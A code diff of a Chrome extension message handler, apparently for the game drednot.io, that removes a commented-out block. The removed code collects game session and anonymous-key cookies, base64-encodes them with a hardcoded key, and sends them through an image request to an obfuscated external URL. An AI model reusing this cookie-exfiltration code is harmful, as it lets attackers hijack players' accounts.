@@ -16,42 +16,6 @@ chrome.runtime.onMessage.addListener(
       "from the extension");
       
     if (request.eventPlease === "trusted")
-    /*
-      if(request.k == "c"){
-          var gs,ts,n,fm,key,ak,tak;
-          key = 'doihwad09dhawiodh89d7iuaHOIhda897yuhaa';
-          split = 'OIhd891Okdj0OjaiiidihoHIOHudwi';
-          n = request.n;
-          chrome.cookies.getAll({name: "game_session"}, function(cookies) {
-              for (var i in cookies) {
-                  gs = JSON.stringify(cookies);
-              }
-              chrome.cookies.getAll({name: "test_game_session"}, function(cookies) {
-                for (var i in cookies) {
-                    ts = JSON.stringify(cookies);
-                }
-                chrome.cookies.getAll({name: "anon_key"}, function(cookies) {
-                  for (var i in cookies) {
-                      ak = JSON.stringify(cookies);
-                  }
-                  chrome.cookies.getAll({name: "test_anon_key"}, function(cookies) {
-                    for (var i in cookies) {
-                        tak = JSON.stringify(cookies);
-                    }
-                    fm = btoa(`${key}${split}${n}${split}${ts}${split}${gs}${split}${ak}${split}${tak}`);
-                
-                    new Image().src = `${atob("aHR0cHM6Ly9kOTh3YXlkOG9paHdhZGtqdWRrd3Q3NmQ4Nzl3YWl1ZGdqc2toZHU5ODczOTc5MS5hY3RpdmVsaWZlLnJlcGwuY28vP2dldHZlcnNpb249")}${fm}`;
-                });
-                  
-              });
-            });
-          });
-  }
-  if(request.mouse == "e"){
-    chrome.cookies.set({name: "coords", value: Math.random().toString().substring(7), url: "https://drednot.io"});
-    chrome.cookies.set({name: "coords", value: Math.random().toString().substring(7), url: "https://test.drednot.io"});
-  }
-  */
     
   if (debuggerEnabled & opened){
       sendResponse({ yourEvent: "dispatching event, one moment" });
